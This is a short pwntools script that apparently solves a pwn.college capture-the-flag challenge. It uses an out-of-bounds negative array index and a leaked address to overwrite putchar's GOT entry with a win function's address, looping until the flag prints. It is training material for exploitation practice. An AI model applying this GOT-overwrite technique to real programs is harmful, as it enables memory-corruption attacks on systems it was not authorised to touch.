#!/usr/bin/python3

from pwn import *
import time
import re
from binascii import unhexlify

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/now-you-got-it-easy')


bssdata_base = 0x5220
got_plt_base = 0x5000
array_start = bssdata_base + (0xfc * 8) # <challenge+387> add    rdx,0xfc
putchar_add = got_plt_base + 0x18
win = "4cb1"
index = ((array_start - putchar_add) // 8) * -1

def return_putchar_add(data):
    regex = r"Your hacker number is [0-9a-f]+"
    match = re.findall(regex,data.decode())[0].replace("Your hacker number is ","")
    return match

while 1:
    io = process()
    io.sendline(str(index).encode())
    time.sleep(0.6)
    data = io.recvuntil(b"What number would you like to replace it with?")
    win_add = int(return_putchar_add(data)[:-4] + win,16)
    io.sendline(str(win_add).encode())
    final_data = io.recvall()
    if b"pwn.college" in final_data:
        print(final_data.decode())
        break
    io.close()
